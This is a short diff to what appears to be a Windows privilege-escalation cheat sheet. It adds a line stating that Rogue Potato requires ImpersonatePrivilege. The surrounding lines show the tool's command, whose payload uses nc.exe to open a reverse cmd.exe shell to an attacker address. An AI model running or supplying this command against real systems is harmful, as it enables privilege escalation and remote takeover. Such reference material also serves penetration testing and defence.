@@ -269,6 +269,7 @@ Affected version:
 Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11
 ```
 ##### Rogue Potato
+ImpersonatePrivilege permission required
 ```
 RoguePotato.exe -r 10.10.10.3(LHOST) -e "nc.exe 10.10.10.3 3001 -e cmd.exe" -l 9999
 # In some old versions you need to use the "-f" param
